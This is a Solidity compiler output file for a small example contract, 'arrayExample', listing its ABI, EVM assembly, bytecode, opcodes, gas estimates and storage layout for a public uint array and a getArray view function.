{
	"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
		"arrayExample": {
			"abi": [
				{
					"inputs": [],
					"name": "getArray",
					"outputs": [
						{
							"internalType": "uint256[]",
							"name": "",
							"type": "uint256[]"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "myArray",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcc3e57d9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd504ea1d\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      0x20\n      mul\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_10:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_10)\n    tag_12:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n    tag_7:\n      0x00\n      dup2\n      dup2\n      sload\n      dup2\n      lt\n      tag_13\n      jumpi\n      invalid\n    tag_13:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n    tag_9:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10036:10049  uint[] memory */\n      0x60\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10067:10074  myArray */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10060:10074  return myArray */\n      dup1\n      sload\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x20\n      mul\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_17:\n      dup2\n      sload\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      0x01\n      add\n      swap1\n      dup1\n      dup4\n      gt\n      tag_17\n      jumpi\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5061018b806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063cc3e57d91461003b578063d504ea1d1461007d575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100dc565b6040518082815260200191505060405180910390f35b6100856100fd565b6040518080602001828103825283818151815260200191508051906020019060200280838360005b838110156100c85780820151818401526020810190506100ad565b505050509050019250505060405180910390f35b600081815481106100e957fe5b906000526020600020016000915090505481565b6060600080548060200260200160405190810160405280929190818152602001828054801561014b57602002820191906000526020600020905b815481526020019060010190808311610137575b505050505090509056fea2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18B DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCC3E57D9 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD504EA1D EQ PUSH2 0x7D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xDC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x85 PUSH2 0xFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH1 0x20 MUL DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xC8 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAD JUMP JUMPDEST POP POP POP POP SWAP1 POP ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0xE9 JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD DUP1 ISZERO PUSH2 0x14B JUMPI PUSH1 0x20 MUL DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 ADD SWAP1 DUP1 DUP4 GT PUSH2 0x137 JUMPI JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEC DUP14 0x29 CALLER 0xD3 0x26 0xCD SHL OR 0xD6 0xC4 PUSH25 0x4AA8E387FFA1617F1CDC04320364B3B97698A2EC64736F6C63 NUMBER STOP MOD MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "79000",
						"executionCost": "129",
						"totalCost": "79129"
					},
					"external": {
						"getArray()": "infinite",
						"myArray(uint256)": "1958"
					}
				},
				"methodIdentifiers": {
					"getArray()": "d504ea1d",
					"myArray(uint256)": "cc3e57d9"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 1869,
						"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:arrayExample",
						"label": "myArray",
						"offset": 0,
						"slot": "0",
						"type": "t_array(t_uint256)dyn_storage"
					}
				],
				"types": {
					"t_array(t_uint256)dyn_storage": {
						"base": "t_uint256",
						"encoding": "dynamic_array",
						"label": "uint256[]",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}